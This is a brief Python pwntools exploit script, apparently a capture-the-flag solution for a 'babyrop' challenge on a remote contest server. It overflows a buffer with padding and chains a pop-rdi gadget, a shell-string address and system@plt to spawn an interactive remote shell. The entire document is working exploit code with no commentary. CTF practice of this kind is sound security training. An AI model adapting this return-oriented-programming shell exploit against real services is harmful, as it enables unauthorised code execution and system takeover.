from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
r = remote('problem.harekaze.com', 20001)
#r = process('./babyrop')

elf = ELF('./babyrop')
system_plt = elf.symbols['system']
sh = 0x601048
#0x0000000000400683 : pop rdi ; ret
gg1 = 0x0000000000400683

p = 'a' * 0x18
p += flat(
	gg1,
	sh,
	system_plt
)

r.recvuntil('? ')
r.sendline(p)
r.interactive()
